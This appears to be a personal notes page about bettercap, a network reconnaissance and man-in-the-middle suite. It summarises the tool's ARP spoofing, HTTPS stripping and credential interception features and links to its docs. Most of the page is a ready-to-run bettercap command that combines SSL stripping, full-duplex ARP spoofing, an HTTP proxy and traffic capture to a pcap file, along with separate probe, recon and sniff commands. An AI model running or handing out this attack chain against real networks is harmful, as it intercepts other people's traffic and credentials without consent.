---
{"dg-publish":true,"permalink":"/bettercap/"}
---


**bettercap** is a versatile suite for network reconnaissance and [[Man in The Middle\|MiTM]] attacks.

It excels at ARP spoofing, DNS manipulation, HTTPS stripping, and credential interception across Wi‑Fi, Bluetooth LE, and Ethernet.

Essentially, it’s a modern Swiss Army knife for sniffing and manipulating network traffic.

- [arp.spoof](https://www.bettercap.org/modules/ethernet/spoofers/arpspoof/)
- [bettercap arp spoof - Google Search](https://www.google.com/search?q=bettercap+arp+spoof&oq=bettercap+arp+&gs_lcrp=EgZjaHJvbWUqCggBEAAYxwMYgAQyDQgAEEUYFhgeGDkYxwMyCggBEAAYxwMYgAQyCggCEAAYxwMYgAQyCAgDEAAYFhgeMgsIBBAAGBYYHhjHAzILCAUQABgWGB4YxwMyCwgGEAAYFhgeGMcDMgsIBxAAGBYYHhjHAzILCAgQABgWGB4YxwMyCAgJEAAYFhge0gEINjU0NmowajeoAgCwAgA&sourceid=chrome&ie=UTF-8)

```bash
bettercap -iface eth0 -eval "set http.proxy.sslstrip true; set net.sniff.verbose true; set net.sniff.output /root/mitm.pcap; set arp.spoof.fullduplex true; set arp.spoof.internal true; net.recon on; net.probe on; arp.spoof on; http.proxy on; net.sniff on"
```

```bash
bettercap -iface eth0
```
```
net.probe on
```

```
net.recon on
```

```bash
net.sniff on
```



